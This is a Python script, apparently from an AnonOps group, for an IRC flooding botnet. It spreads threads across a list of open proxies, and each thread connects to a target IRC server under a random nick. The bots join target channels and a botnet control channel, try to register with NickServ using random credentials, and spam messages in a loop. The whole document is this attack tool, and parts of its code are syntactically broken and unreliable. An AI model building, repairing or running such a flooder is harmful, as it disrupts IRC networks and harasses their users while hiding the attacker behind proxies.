## Internet Relay Chat DroneNet.
## Project by #Programmers - AnonOps
## Authors: Aha2Y, Foxboron, 

#Files
socks.py - http://pastebay.com/138080
proxylist.txt - http://pastebin.com/FSguxeAD

import socks  
import socket
import random
import threading
import time
import string

######################### CONFIGURE HERE #############################

#The IRC server which will be flooded.
server = "irc.network.com"

#Which port will be used?
port = 6667

#Which channels will be flooded?
channels = ["#channel1", "#channel2"]

#Spam message?
message = "test"

#Which proxy list will be used?
proxylist = "proxylist.txt"

#Control Channel?
control_channel = #botnet

########## CODE HERE DONT EDIT IT WITHOUT KNOWLEDGE! #############

#generates a random string based on a seed and a bunch of letters.
def generateWord():
    char_array = 'abcdefghijklmnopqrstuvwxyzABCDEFHIJKLMNOPQRSTUVWXYZ'
    random.seed(time()) #seed goes here. time() might not be the best.
    word = ''
    for i in range(0, 8): # 8 letter word
        word += char_array[random.randint(0, 25)] #Not 50???
    return word  #returns the word.

i = 0
fil = open(proxylist, "r")
lines = fil.readlines()
fil.close()
random.shuffle(lines)

class MyThread(threading.Thread):
    def run(self):
        number = random.randint(1,99999)
        ircsock = socks.socksocket()

        choice = proxy.split(":") #Isn't-it "lines"? 

        pport = choice[1]
        pserver = choice[0]

        lol = 1
        pport = pport.replace("\n", "")
        
        try:
            ircsock.setproxy(socks.PROXY_TYPE_HTTP, pserver, int(pport))
            ircsock.connect((server, port))
            ircsock.send("USER "+ nick +" "+ nick +" "+ nick +" :"+ nick +"\n")
            ircsock.send("NICK "+ nick +"\n")
            
            while 1:
                ircmsg = ircsock.recv(1024)

                #Send back the IRC resonse to the python client.
                ircmsg = ircmsg.strip('\n')

                #Not all IRC's send back a resonse in /n/r, 
                #but /n is always there, so we add a if statment to check 
                #if 7r is there and strip it if its present.
                if "\r" in ircmsg:
                   ircmsg = ircmsg.strip("\r")
                ircmsg = ircmsg.lower()
                number = random.randint(5, 30)
                chn = random.choice(channels)
                print ircmsg
                ircsock.send("JOIN "+ chn +"\n")
                
                #Will reply pong to a ping request of the IRC Deamon
                if ircmsg.find("ping :") != -1:
                    if ircmsg.find("timeout") != -1 or ircmsg.find("quit") != -1:
                        print("beep")
                    
                    else:
                        ping = ircmsg.split("ping :")
                        ircsock.send("PONG "+ ping[1] +"\n")
                        #Join the target channels.
                        ircsock.send("JOIN "+ chn +"\n") 
                        #Join the control channel
                        ircsock.send(" JOIN '+ control_channel +' \n") 

                        #Register the current nick of the bot with NickServ (UnTested)- added random words as mail and password.
                        try:
                            ircsock.send(" PRIVMSG NickServ: '+ generateWord() +' '+ generateWord() + "@" + generateWord() ".com" +'\n") 
			#You have to wait 180 seconds to register :P, no?

                # CTCP VERSION the channel, doesn't work if the channel is +C.
                #ircsock.send("PRIVMSG " + chn + " :\001VERSION\001\n")
                
                # uncomment the following two lines to send a random message
                #spam = "".join(random.choice(string.letters) for _ in range(number))
                #ircsock.send("PRIVMSG " + chn + " :" + spam + "\n")
                
                # send a predefined message
                ircsock.send("PRIVMSG " + chn + " :message\n")
                
                time.sleep(1)
        except:
            ircsock.close()


#Here it will generate the random nicknames.
for x in xrange(len(lines)):
    nicklength = random.randint(3,99)
    number = random.randint(1,99999)
    nick = "".join(random.choice(string.letters) for _ in range(nicklength))
    
    proxy = lines[i]
    
    print(i)
    i = i + 1
    
    MyThread().start()
    time.sleep(0.04)

